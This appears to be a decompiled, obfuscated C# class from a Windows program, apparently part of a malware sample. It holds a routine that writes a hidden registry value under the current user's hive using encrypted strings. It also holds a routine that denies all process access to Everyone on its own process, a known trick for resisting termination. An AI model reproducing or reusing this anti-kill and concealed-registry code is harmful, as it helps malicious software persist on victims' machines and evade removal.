using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jDlAujUelC;

internal sealed class OFlKPtqUUnHM
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr TKLGXoNxwjx, int peuiDFDsxpv, [Out] byte[] GnCYZFJZhOjHdJG, uint bRQBScTlZZNPRH, out uint bqfTEMQhjAxxj);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr yShlUdUYPQZ, int asGZlicFhv, [In] byte[] VEViiAsXtqdvx);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void cjelyGXedcD(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(hNCHegfceoe.UwCpksGCJZfb(getString_0(107354906)));
			registryKey.SetValue(hNCHegfceoe.UwCpksGCJZfb(getString_0(107355313)), getString_0(107395728));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor dlwFpZdvIVmrDr(IntPtr intptr_0)
	{
		byte[] gnCYZFJZhOjHdJG = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, gnCYZFJZhOjHdJG, 0u, out var bqfTEMQhjAxxj);
		if ((long)bqfTEMQhjAxxj > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, gnCYZFJZhOjHdJG = new byte[bqfTEMQhjAxxj], bqfTEMQhjAxxj, out bqfTEMQhjAxxj))
		{
			return null;
		}
		return new RawSecurityDescriptor(gnCYZFJZhOjHdJG, 0);
	}

	private void mvSmpRIeRFuajp(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void AzrxnpouKyAG()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = dlwFpZdvIVmrDr(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			mvSmpRIeRFuajp(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static OFlKPtqUUnHM()
	{
		Strings.CreateGetStringDelegate(typeof(OFlKPtqUUnHM));
	}
}
